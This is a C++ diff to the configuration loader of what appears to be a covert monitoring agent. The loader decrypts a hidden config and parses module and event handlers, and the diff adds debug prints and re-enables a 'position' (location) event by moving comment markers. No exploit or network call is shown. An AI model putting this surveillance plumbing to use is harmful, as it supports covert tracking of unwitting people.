@@ -15,7 +15,11 @@ using namespace std;
 Conf::Conf() : encryptionObj(g_ConfKey, KEY_LEN), jMod(NULL), jEv(NULL), jAct(NULL), jGlob(NULL) {
 	statusObj = Status::self();
 
+	
+
 	strEncryptedConfName = g_ConfName;
+	OutputDebugString(strEncryptedConfName.c_str());
+
 }
 
 Conf::~Conf(){
@@ -221,12 +225,12 @@ BOOL WINAPI Conf::ParseEvent(JSONArray js) {
 				startProc = OnConnection;
 				break;
 			}
-
+			***/
 			if (eventName.compare(L"position") == 0 ) {
 				startProc = OnLocation;
 				continue;
 			}
-
+			/***
 			if (eventName.compare(L"process") == 0 ) {
 				startProc = OnProcess;
 				break;
@@ -328,6 +332,8 @@ BOOL Conf::LoadConf() {
 	wstring strBack, strMig;
 	UINT Len = 0, i = 0, num = 0;
 	BOOL bBackConf = FALSE;
+	
+	OutputDebugString(strEncryptedConfName.c_str());
 
 	if (strEncryptedConfName.empty())
 		return NULL;
@@ -351,6 +357,7 @@ BOOL Conf::LoadConf() {
 	// Vediamo prima se esiste una configurazione di backup valida
 	strBack = GetBackupName(FALSE);
 
+
 	if (strBack.empty() == FALSE && FileExists(strBack)) {
 		pConf = encryptionObj.DecryptConf(strBack, &Len);
 
@@ -363,6 +370,7 @@ BOOL Conf::LoadConf() {
 		}
 	}
 
+
 	// Se non c'e' carichiamo quella di default
 	if (pConf == NULL || Len == 0) {
 		pConf = encryptionObj.DecryptConf(strEncryptedConfName, &Len);
@@ -370,9 +378,9 @@ BOOL Conf::LoadConf() {
 		bBackConf = TRUE; // Significa che dobbiamo spostare la conf di backup
 	}
 
+
 	if (pConf == NULL || Len == 0)
 		return FALSE;
-	//
 
 	ParseConfSection(jMod, (char *)pConf, L"modules", (confCallback_t)&Conf::ParseModule);
 	ParseConfSection(jEv, (char *)pConf, L"events", (confCallback_t)&Conf::ParseEvent);
@@ -385,6 +393,7 @@ BOOL Conf::LoadConf() {
 		ZeroMemory(pConf, Len);
 		CLEAN_AND_EXIT(TRUE);
 	}
+
 
 	wstring strPath;
 
